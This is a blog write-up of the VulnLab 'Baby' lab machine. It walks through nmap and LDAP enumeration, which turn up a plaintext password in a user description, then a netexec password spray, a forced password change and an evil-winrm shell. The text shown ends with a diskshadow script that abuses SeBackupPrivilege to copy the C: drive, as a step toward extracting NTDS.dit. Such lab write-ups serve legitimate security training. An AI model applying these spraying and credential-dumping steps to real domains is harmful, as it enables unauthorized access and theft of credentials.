+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../../../index.html" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+              <div class="md-post__authors md-typeset">
+                
+                  <div class="md-profile md-post__profile">
+                    <span class="md-author md-author--long">
+                      <img src="https://avatars.githubusercontent.com/u/108031577?v=4" alt="Tom Fieber">
+                    </span>
+                    <span class="md-profile__description">
+                      <strong>
+                        
+                          <a href="https://tomfieber.github.io">Tom Fieber</a>
+                        
+                      </strong>
+                      <br>
+                      Dad, husband, okay pentester
+                    </span>
+                  </div>
+                
+              </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2024-06-29 00:00:00+00:00" class="md-ellipsis">June 29, 2024</time>
+                      </div>
+                    </li>
+                    
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../../../category/writeups.html">writeups</a>, 
+                              <a href="../../../category/vulnlab.html">vulnlab</a></span>
+                        </div>
+                      </li>
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              10 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+        <span class="md-tag">backup</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">ldap</span>
+      
+    
+      
+      
+      
+        <span class="md-tag">secretsdump</span>
+      
+    
+  </nav>
+
+
+  
+  
+
+
+<h1 id="vulnlab-baby">VulnLab: Baby<a class="headerlink" href="#vulnlab-baby" title="Permanent link">&para;</a></h1>
+<p>Baby is an <strong>EASY</strong> difficulty machine on <a href="https://wiki.vulnlab.com/guidance/easy/baby">VulnLab</a>. This machine involved performing LDAP enumeration to identify valid domain users and locate a plaintext password in one of the user description fields. By spraying that password across all the identified users, we find one that requires a password change, which once complete gives us an initial shell on the box. Once on the box, we discover that the current user has backup privileges, which allow us to create a copy of the drive and extract the NTDS.dit. That, along with the SAM and SYSTEM hives, allow us to dump all domain credentials with <code>secretsdump.py</code>. </p>
+<!-- more -->
+<p><a class="glightbox" href="../../../images/vulnlab_baby/baby.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../images/vulnlab_baby/baby.png" /></a></p>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="go">PORT      STATE SERVICE       REASON          VERSION</span>
+<span class="go">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span>
+<span class="go">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-06-21 11:52:19Z)</span>
+<span class="go">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+<span class="go">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span>
+<span class="go">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span>
+<span class="go">445/tcp   open  microsoft-ds? syn-ack ttl 127</span>
+<span class="go">464/tcp   open  kpasswd5?     syn-ack ttl 127</span>
+<span class="go">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span>
+<span class="go">636/tcp   open  tcpwrapped    syn-ack ttl 127</span>
+<span class="go">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span>
+<span class="go">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span>
+<span class="go">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span>
+<span class="go">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span>
+<span class="go">| Issuer: commonName=BabyDC.baby.vl</span>
+<span class="go">| Public Key type: rsa</span>
+<span class="go">| Public Key bits: 2048</span>
+<span class="go">| Signature Algorithm: sha256WithRSAEncryption</span>
+<span class="go">| Not valid before: 2024-06-20T11:21:52</span>
+<span class="go">| Not valid after:  2024-12-20T11:21:52</span>
+<span class="go">| MD5:   1553:8e6f:d6f7:6a63:9c3e:fb81:d241:adb2</span>
+<span class="go">| SHA-1: bc71:79c1:6c0c:ae2b:00f6:ec7f:7b4e:8dbf:31a0:c22e</span>
+<span class="go">| -----BEGIN CERTIFICATE-----</span>
+<span class="go">| MIIC4DCCAcigAwIBAgIQFcXuQwk5Mr5Iro4L87Y/gjANBgkqhkiG9w0BAQsFADAZ</span>
+<span class="go">| MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNDA2MjAxMTIxNTJaFw0yNDEy</span>
+<span class="go">| MjAxMTIxNTJaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG</span>
+<span class="go">| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuquv0xygIC6VYkeMb0xvhqlKSP4NuWZgS1rw</span>
+<span class="go">| vohVW8/SdsUY2CLaXpR7csnkVI3nNvxYOv35qm/LfrUrMvbbT5YCPo5jqy6tp9Df</span>
+<span class="go">| 5+EwK3vnY3fdY3GaXEDifkp1J132+ZGM+SQx1paCj5uTsXYrlCLSO6EFvqCB+mfU</span>
+<span class="go">| vRD8FPmbY+FA2Cd7gSK2J6gF854PiOwMIUT9HRy+0J2xVzAKTAMxgF5w+9YMucvN</span>
+<span class="go">| SLFmWVqQZcRFk0yVWwtbVxv/OT4Lsz3uyWmZFV+5d+8zd1S+W+BqeremGsW47xWP</span>
+<span class="go">| kZQRBaXMtyggG4ymVT2jZDkGroSBi10OeGsGTrsrY6xEstAQ3QIDAQABoyQwIjAT</span>
+<span class="go">| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD</span>
+<span class="go">| ggEBAD4PWAN6BB8rb1EBve9LNkXUWHSb0m4u2LYjGVfSXI4aeXULELMTpX8Kf1Oy</span>
+<span class="go">| 5+Voaij0stmH+pcYfhzcnZz6cSYbhk2JRphfyRVmtppHAK5jKrk5ut4lr4XiWItp</span>
+<span class="go">| qOqZcKzcWfThp92LRwx+2dx8YEXBzLQVnAAcbXe7VbM3qJHHu/RChQHYb9+u0Czr</span>
+<span class="go">| 8ut/5n9XPPOLO3FLVmJ7EHjWwFTAS+a6wPPqFdzKtR2DJ3T7DhwXVmqG5AGY+JFS</span>
+<span class="go">| ShFRSOmEc1joekHyNYuwfPNQk/TCdKyFt76N6tMcq70CRpDNaSOCp3r5cvSY2BH+</span>
+<span class="go">| 2X2UcOYxSOiC0YEv8SxBCirWoJA=</span>
+<span class="go">|_-----END CERTIFICATE-----</span>
+<span class="go">| rdp-ntlm-info: </span>
+<span class="go">|   Target_Name: BABY</span>
+<span class="go">|   NetBIOS_Domain_Name: BABY</span>
+<span class="go">|   NetBIOS_Computer_Name: BABYDC</span>
+<span class="go">|   DNS_Domain_Name: baby.vl</span>
+<span class="go">|   DNS_Computer_Name: BabyDC.baby.vl</span>
+<span class="go">|   Product_Version: 10.0.20348</span>
+<span class="go">|_  System_Time: 2024-06-21T11:53:09+00:00</span>
+<span class="go">|_ssl-date: 2024-06-21T11:53:49+00:00; 0s from scanner time.</span>
+<span class="go">5357/tcp  open  tcpwrapped    syn-ack ttl 127</span>
+<span class="go">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0</span>
+<span class="go">|_http-title: Not Found</span>
+<span class="go">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span>
+<span class="go">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+<span class="go">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+<span class="go">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+<span class="go">49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span>
+<span class="go">49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+<span class="go">56612/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+<span class="go">64285/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span>
+</code></pre></div>
+<h3 id="service-footprinting">Service footprinting<a class="headerlink" href="#service-footprinting" title="Permanent link">&para;</a></h3>
+<h4 id="ldap-enumeration">LDAP Enumeration<a class="headerlink" href="#ldap-enumeration" title="Permanent link">&para;</a></h4>
+<p>Initial checks didn't return anything for me, but once I added the base naming context, I got some results. </p>
+<div class="highlight"><pre><span></span><code><span class="go">〉ldapsearch -x -H ldap://$ip -b &quot;DC=baby,DC=vl&quot;                     </span>
+<span class="gp"># </span>extended<span class="w"> </span>LDIF<span class="w">  </span>
+<span class="gp">#  </span>
+<span class="gp"># </span>LDAPv3<span class="w">  </span>
+<span class="gp"># </span>base<span class="w"> </span>&lt;<span class="nv">DC</span><span class="o">=</span>baby,DC<span class="o">=</span>vl&gt;<span class="w"> </span>with<span class="w"> </span>scope<span class="w"> </span>subtree<span class="w">  </span>
+<span class="gp"># </span>filter:<span class="w"> </span><span class="o">(</span><span class="nv">objectclass</span><span class="o">=</span>*<span class="o">)</span><span class="w">  </span>
+<span class="gp"># </span>requesting:<span class="w"> </span>ALL<span class="w">  </span>
+<span class="gp">#  </span>
+
+<span class="gp"># </span>baby.vl<span class="w">  </span>
+<span class="go">dn: DC=baby,DC=vl  </span>
+
+<span class="gp"># </span>Administrator,<span class="w"> </span>Users,<span class="w"> </span>baby.vl<span class="w">  </span>
+<span class="go">dn: CN=Administrator,CN=Users,DC=baby,DC=vl  </span>
+
+<span class="go">[...SNIP...]</span>
+
+<span class="gp"># </span>Teresa<span class="w"> </span>Bell,<span class="w"> </span>it,<span class="w"> </span>baby.vl<span class="w">  </span>
+<span class="go">dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl  </span>
+<span class="go">objectClass: top  </span>
+<span class="go">objectClass: person  </span>
+<span class="go">objectClass: organizationalPerson  </span>
+<span class="go">objectClass: user  </span>
+<span class="go">cn: Teresa Bell  </span>
+<span class="go">sn: Bell  </span>
+<span class="go">description: Set initial password to BabyStart123!  </span>
+<span class="go">givenName: Teresa  </span>
+<span class="go">distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl  </span>
+<span class="go">instanceType: 4  </span>
+<span class="go">whenCreated: 20211121151108.0Z  </span>
+<span class="go">whenChanged: 20211121151437.0Z  </span>
+<span class="go">displayName: Teresa Bell  </span>
+<span class="go">uSNCreated: 12889  </span>
+<span class="go">memberOf: CN=it,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">uSNChanged: 12905  </span>
+<span class="go">name: Teresa Bell  </span>
+<span class="go">objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==  </span>
+<span class="go">userAccountControl: 66080  </span>
+<span class="go">badPwdCount: 0  </span>
+<span class="go">codePage: 0  </span>
+<span class="go">countryCode: 0  </span>
+<span class="go">badPasswordTime: 0  </span>
+<span class="go">lastLogoff: 0  </span>
+<span class="go">lastLogon: 0  </span>
+<span class="go">pwdLastSet: 132819812778759642  </span>
+<span class="go">primaryGroupID: 513  </span>
+<span class="go">objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==  </span>
+<span class="go">accountExpires: 9223372036854775807  </span>
+<span class="go">logonCount: 0  </span>
+<span class="go">sAMAccountName: Teresa.Bell  </span>
+<span class="go">sAMAccountType: 805306368  </span>
+<span class="go">userPrincipalName: Teresa.Bell@baby.vl  </span>
+<span class="go">objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl  </span>
+<span class="go">dSCorePropagationData: 20211121163014.0Z  </span>
+<span class="go">dSCorePropagationData: 20211121162927.0Z  </span>
+<span class="go">dSCorePropagationData: 16010101000416.0Z  </span>
+<span class="go">msDS-SupportedEncryptionTypes: 0  </span>
+
+<span class="go">[...SNIP...]</span>
+</code></pre></div>
+<p>Note the description field for the <code>Teresa.Bell</code> user.</p>
+<div class="highlight"><pre><span></span><code><span class="go">description: Set initial password to BabyStart123!</span>
+</code></pre></div>
+<p>We can get a full list of users with the following command:</p>
+<div class="highlight"><pre><span></span><code><span class="go">〉ldapsearch -x -H ldap://$ip -b &quot;DC=baby,DC=vl&quot; &quot;users&quot; | grep dn  </span>
+<span class="go">dn: DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Administrator,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Guest,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=krbtgt,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Domain Users,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Protected Users,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Key Admins,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=dev,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Hugh George,OU=dev,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=it,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl</span>
+</code></pre></div>
+<p>Getting rid of all the groups we get the following list. </p>
+<div class="highlight"><pre><span></span><code><span class="go">〉cat users.txt  </span>
+<span class="go">administrator  </span>
+<span class="go">guest  </span>
+<span class="go">jacqueline.barnett  </span>
+<span class="go">ashley.webb  </span>
+<span class="go">hugh.george  </span>
+<span class="go">leonard.dyer  </span>
+<span class="go">ian.walker  </span>
+<span class="go">connor.wilkinson  </span>
+<span class="go">caroline.robinson  </span>
+<span class="go">joseph.hughes  </span>
+<span class="go">kerry.wilson  </span>
+<span class="go">teresa.bell</span>
+</code></pre></div>
+<h2 id="foothold">Foothold<a class="headerlink" href="#foothold" title="Permanent link">&para;</a></h2>
+<p>Now we can use <code>netexec</code> to spray the previously discovered password against the list of domain users. </p>
+<div class="highlight"><pre><span></span><code><span class="go">〉nxc smb $ip -u users.txt -p &#39;BabyStart123!&#39;  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BA  </span>
+<span class="go">BYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\administrator:BabyStart123! STATUS_L  </span>
+<span class="go">OGON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\guest:BabyStart123! STATUS_LOGON_FAI  </span>
+<span class="go">LURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\jacqueline.barnett:BabyStart123! STA  </span>
+<span class="go">TUS_LOGON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\ashley.webb:BabyStart123! STATUS_LOG  </span>
+<span class="go">ON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\hugh.george:BabyStart123! STATUS_LOG  </span>
+<span class="go">ON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\leonard.dyer:BabyStart123! STATUS_LO  </span>
+<span class="go">GON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\ian.walker:BabyStart123! STATUS_LOGO  </span>
+<span class="go">N_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\connor.wilkinson:BabyStart123! STATU  </span>
+<span class="go">S_LOGON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STAT  </span>
+<span class="go">US_PASSWORD_MUST_CHANGE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\joseph.hughes:BabyStart123! STATUS_L  </span>
+<span class="go">OGON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\kerry.wilson:BabyStart123! STATUS_LO  </span>
+<span class="go">GON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\teresa.bell:BabyStart123! STATUS_LOG  </span>
+<span class="go">ON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\:BabyStart123! STATUS_LOGON_FAILURE</span>
+</code></pre></div>
+<p>Note that we need to change caroline robinson's password. </p>
+<div class="highlight"><pre><span></span><code><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STAT  </span>
+<span class="go">US_PASSWORD_MUST_CHANGE</span>
+</code></pre></div>
+<p>We can change it with <code>smbpasswd</code>. </p>
+<div class="highlight"><pre><span></span><code><span class="go">〉smbpasswd -r $ip -U BABY.vl/caroline.robinson  </span>
+<span class="go">Old SMB password:  </span>
+<span class="go">New SMB password:  </span>
+<span class="go">Retype new SMB password:  </span>
+<span class="go">Password changed for user caroline.robinson</span>
+</code></pre></div>
+<p>Once the password is changed, we can confirm it with <code>netexec</code>. </p>
+<div class="highlight"><pre><span></span><code><span class="go">〉nxc smb $ip -u caroline.robinson -p &#39;P@ssw0rd123!&#39;  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BA  </span>
+<span class="go">BYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [+] baby.vl\caroline.robinson:P@ssw0rd123!</span>
+</code></pre></div>
+<p>Perfect! Now that we have a valid credential for the <code>caroline.robinson</code> user, we can log into the machine with <code>evil-winrm</code>. </p>
+<div class="highlight"><pre><span></span><code><span class="go">〉evil-winrm -i $ip -u &#39;caroline.robinson&#39; -p &#39;P@ssw0rd123!&#39;  </span>
+<span class="go">                                          </span>
+<span class="go">Evil-WinRM shell v3.5  </span>
+<span class="go">                                          </span>
+<span class="go">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() functi  </span>
+<span class="go">on is unimplemented on this machine  </span>
+<span class="go">                                          </span>
+<span class="go">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remot  </span>
+<span class="go">e-path-completion  </span>
+<span class="go">                                          </span>
+<span class="go">Info: Establishing connection to remote endpoint  </span>
+<span class="go">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt;</span>
+</code></pre></div>
+<p>Grab the user flag and start enumerating. </p>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<p>Checking our current privileges, we find that <code>caroline.robinson</code> has the <code>SeBackupPrivilege</code> enabled. With this privilege enabled, the user can bypass file and directory restrictions for the purpose of backing them up. This privilege causes the system to grant all read access to any file, regardless of the access control list specified for the file. </p>
+<p><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672">4672(S) Special privileges assigned to new logon. - Windows 10 | Microsoft Learn</a></p>
+<div class="highlight"><pre><span></span><code><span class="go">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt; whoami /all  </span>
+
+<span class="go">USER INFORMATION  </span>
+<span class="go">----------------  </span>
+
+<span class="go">User Name              SID  </span>
+<span class="go">====================== ==============================================  </span>
+<span class="go">baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1111  </span>
+
+
+<span class="go">GROUP INFORMATION  </span>
+<span class="go">-----------------  </span>
+
+<span class="go">Group Name                                 Type             SID                                       </span>
+<span class="go">      Attributes  </span>
+<span class="go">========================================== ================ ========================================  </span>
+<span class="go">====== ==================================================  </span>
+<span class="go">Everyone                                   Well-known group S-1-1-0                                   </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">BUILTIN\Backup Operators                   Alias            S-1-5-32-551                              </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">BUILTIN\Users                              Alias            S-1-5-32-545                              </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                              </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">BUILTIN\Remote Management Users            Alias            S-1-5-32-580                              </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                   </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                  </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">NT AUTHORITY\This Organization             Well-known group S-1-5-15                                  </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">BABY\it                                    Group            S-1-5-21-1407081343-4001094062-144464765  </span>
+<span class="go">4-1109 Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                               </span>
+<span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
+<span class="go">Mandatory Label\High Mandatory Level       Label            S-1-16-12288  </span>
+
+
+<span class="go">PRIVILEGES INFORMATION  </span>
+<span class="go">----------------------  </span>
+
+<span class="go">Privilege Name                Description                    State  </span>
+<span class="go">============================= ============================== =======  </span>
+<span class="go">SeMachineAccountPrivilege     Add workstations to domain     Enabled  </span>
+<span class="go">SeBackupPrivilege             Back up files and directories  Enabled  </span>
+<span class="go">SeRestorePrivilege            Restore files and directories  Enabled  </span>
+<span class="go">SeShutdownPrivilege           Shut down the system           Enabled  </span>
+<span class="go">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  </span>
+<span class="go">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  </span>
+
+
+<span class="go">USER CLAIMS INFORMATION  </span>
+<span class="go">-----------------------  </span>
+
+<span class="go">User claims unknown.  </span>
+
+<span class="go">Kerberos support for Dynamic Access Control on this device has been disabled.</span>
+</code></pre></div>
+<p>Note the SeBackupPrivilege. We can abuse this using the method here: </p>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators">Privileged Groups | HackTricks</a></p>
+<p>I added the "X" to the end of each line because I found that the last character was getting stripped off in the next step.</p>
+<div class="highlight"><pre><span></span><code><span class="go">set metadata C:\Windows\Temp\meta.cabX</span>
+<span class="go">set context clientaccessibleX</span>
+<span class="go">set context persistentX</span>
+<span class="go">begin backupX</span>
+<span class="go">add volume C: alias cdriveX</span>
+<span class="go">createX</span>
+<span class="go">expose %cdrive% F:X</span>
+<span class="go">end backupX</span>
+</code></pre></div>
+<p>Then I uploaded that to the <code>C:\Windows\Tasks</code> directory and executed it with:</p>
+<div class="highlight"><pre><span></span><code><span class="go">diskshadow /s script.txt</span>
+</code></pre></div>
+<p>After running the script with diskshadow, we can see that we've successfully backed up the <code>C:\</code> drive.</p>
+<div class="highlight"><pre><span></span><code><span class="go">*Evil-WinRM* PS C:\Windows\Tasks&gt; diskshadow /s script.txt  </span>
+<span class="go">Microsoft DiskShadow version 1.0  </span>
+<span class="go">Copyright (C) 2013 Microsoft Corporation  </span>
+<span class="go">On computer:  BABYDC,  6/21/2024 12:37:10 PM  </span>
+
+<span class="go">-&gt; set metadata C:\Windows\Temp\meta.cab  </span>
+<span class="go">-&gt; set context clientaccessible  </span>
+<span class="go">-&gt; set context persistent  </span>
+<span class="go">-&gt; begin backup  </span>
+<span class="go">-&gt; add volume C: alias cdrive  </span>
+<span class="go">-&gt; create  </span>
+<span class="go">Alias cdrive for shadow ID {0925b2b9-cf5d-427d-9a6b-ba68992a63fc} set as environment variable.  </span>
+<span class="go">Alias VSS_SHADOW_SET for shadow set ID {ed611205-454f-4713-9c5c-c41e3ca812e0} set as environment variable.  </span>
+
+<span class="go">Querying all shadow copies with the shadow copy set ID {ed611205-454f-4713-9c5c-c41e3ca812e0}  </span>
+
+<span class="go">       * Shadow copy ID = {0925b2b9-cf5d-427d-9a6b-ba68992a63fc}               %cdrive%  </span>
+<span class="go">               - Shadow copy set: {ed611205-454f-4713-9c5c-c41e3ca812e0}       %VSS_SHADOW_SET%  </span>
+<span class="go">               - Original count of shadow copies = 1  </span>
+<span class="go">               - Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]  </span>
+<span class="go">               - Creation time: 6/21/2024 12:37:29 PM  </span>
+<span class="go">               - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1  </span>
+<span class="go">               - Originating machine: BabyDC.baby.vl  </span>
+<span class="go">               - Service machine: BabyDC.baby.vl  </span>
+<span class="go">               - Not exposed  </span>
+<span class="go">               - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}  </span>
+<span class="go">               - Attributes:  No_Auto_Release Persistent Differential  </span>
+
+<span class="go">Number of shadow copies listed: 1  </span>
+<span class="go">-&gt; expose %cdrive% F:  </span>
+<span class="go">-&gt; %cdrive% = {0925b2b9-cf5d-427d-9a6b-ba68992a63fc}  </span>
+<span class="go">The shadow copy was successfully exposed as F:\.  </span>
+<span class="go">-&gt; end backup  </span>
+<span class="go">-&gt;</span>
+</code></pre></div>
